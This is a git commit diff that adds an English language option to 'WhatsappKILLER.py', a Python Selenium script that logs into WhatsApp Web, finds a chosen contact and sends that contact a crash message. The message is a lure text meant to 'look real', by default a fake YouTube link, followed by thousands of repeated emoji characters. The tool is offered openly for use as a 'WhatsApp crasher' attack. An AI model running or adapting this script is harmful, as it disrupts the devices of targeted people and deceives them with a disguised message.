c1c23967e6ed71af36cbc635d11f8822371d6847
Fare9 <eblazquez.94@gmail.com>
2015-12-30 20:23:20 +0100

    Añadido para usarlo en inglés

--- WhatsappKILLER.py
+++ WhatsappKILLER.py
@@ -26,6 +26,16 @@ WARNING = '\033[93m'
 FAIL    = '\033[91m'
 ENDC    = '\033[0m'
 
+Languages = ['English','Spanish']
+
+print '¿English/Español?(1/2)'
+seleccion = 0
+while seleccion != 1 and seleccion != 2:
+  seleccion = int(raw_input('>> '))
+
+seleccion = seleccion-1
+lan = Languages[seleccion]
+
 bannerP = '''
             ╦ ╦┬ ┬┌─┐┌┬┐┌─┐┌─┐┌─┐┌─┐  
             ║║║├─┤├─┤ │ └─┐├─┤├─┘├─┘  
@@ -69,20 +79,27 @@ banner = '''
 print banner
 print bannerP
 
-print '///BIENVENIDO A WHATSAPP CRASHER PRESIONA ENTER PARA CONTINUAR\\\\\\'
+if lan=='English':
+  print '///WELCOME TO WHATSAPP CRASHER PRESS ENTER TO CONTINUE\\\\\\'
+else:
+  print '///BIENVENIDO A WHATSAPP CRASHER PRESIONA ENTER PARA CONTINUAR\\\\\\'
 
 raw_input()
 
-
-print '[+] Abriendo Navegador con la web'
+if lan=='English':
+  print '[+] Opening Browser with web'
+else:
+    print '[+] Abriendo Navegador con la web'
 
 driver = webdriver.Firefox()
 driver.get(WEB)
 
 sleep(5)
 
-
-print '[+] Abre whatsapp con el codigo QR, pulsa enter cuando lo tengas...'
+if lan=='English':
+  print '[+] Open whatsapp with QR code, press Enter when finish...'
+else:
+  print '[+] Abre whatsapp con el codigo QR, pulsa enter cuando lo tengas...'
 
 raw_input()
 
@@ -97,16 +114,25 @@ except Exception as e:
 
 
 if avatar == None:
-    print '[-] Lo siento no se encuentra en whatsapp web'
+    if lan=='English':
+      print "[-] Sorry you're not in whatsapp web"
+    else: 
+      print '[-] Lo siento no se encuentra en whatsapp web'
     sys.exit(-1)
 else:
-    print '[+] Bienvenido "Empieza el juego"'
+    if lan=='English':
+      print '[+] Welcome "Start the game"'
+    else:
+      print '[+] Bienvenido "Empieza el juego"'
 
 #ahora buscamos el input de los nombres de usuario
 try:
     buscador = driver.find_elements_by_xpath("//div[@id='app']/div/div/div/div/div/label/input[@class='input input-search']")[0]
     buscador.click()
-    nombreUsuario = raw_input("Nombre usuario a buscar>> ")
+    if lan=='English':
+      nombreUsuario = raw_input('Name to find>> ')
+    else:
+      nombreUsuario = raw_input("Nombre usuario a buscar>> ")
     buscador.send_keys(nombreUsuario)
     buscador.send_keys(Keys.ENTER)
 except Exception as e:
@@ -118,35 +144,52 @@ try:
     userBox = driver.find_elements_by_xpath("//div[@class='infinite-list-viewport']/div")
     index = 0
     if len(userBox) > 1:
-        index = int(raw_input('Hay mas de uno a cual quieres acceder (1 a N): '))
+        if lan=='English':
+          index = int(raw_input('More than one,select one (1 to N): '))
+        else:
+          index = int(raw_input('Hay mas de uno a cual quieres acceder (1 a N): '))
         index -= 1
 
     userBox[index].click()
 except Exception as e:
     print '[-] ERROR BUSCANDO userBox:',e
 
+SocialE = ''
+if lan=='English':
+  SocialE = raw_input("Insert a text to make the message look real: ")
+else:
+  SocialE = raw_input("Introduzca un texto para que el mensaje parezca real: ")
 
-socialE = raw_input("Introduzca un texto para que el mensaje parezca real: ")
-
-if len(socialE) == 0:
-  print '[+] No ha elegido texto, usando uno por defecto: "Mira que pasada! http://youtube.com/..."'
-  SocialE = 'Mira que pasada! http://youtube.com/...'
+if len(SocialE) == 0:
+  if lan=='English':
+    print "[+] You haven't written a text, choosing one by default: 'Look This amazin! http://youtube.com/...'"
+    SocialE = 'Look This amazin! http://youtube.com/...'
+  else:
+    print '[+] No ha elegido texto, usando uno por defecto: "Mira que pasada! http://youtube.com/..."'
+    SocialE = 'Mira que pasada! http://youtube.com/...'
 
 #ahora buscamos la caja de input y enviamos un mensaje
 try:
-    print '[+] Buscando inputBox'
+    #print '[+] Buscando inputBox'
     inputBox = driver.find_elements_by_xpath("//div[@class='block-compose']/div[@class='input-container']/div[@class='input-emoji']/div[@class='input']")[0]
     inputBox.click()
-    fuzzer = u"\uE311" * 1000
+    fuzzer = u"\uE311" * 100
     inputBox.send_keys(SocialE)
-    for i in range(7):
+    if lan=='English':
+    	print '[+] Wait a moment we are writing the message'
+    else:
+    	print '[+] Espere un momento estamos escribiendo el mensaje'
+    for i in range(70):
         inputBox.send_keys(fuzzer)
     inputBox.send_keys(Keys.ENTER)
 except Exception as e:
     print '[-] ERROR BUSCANDO inputBox:',e
 
+if lan=='English':
+  print '[+] Press Enter to finish'
+else:
+  print '[+] Ataque finalizado presiona enter para acabar'
 
-print '[+] Ataque finalizado presiona enter para acabar'
 raw_input()
 
 driver.close()
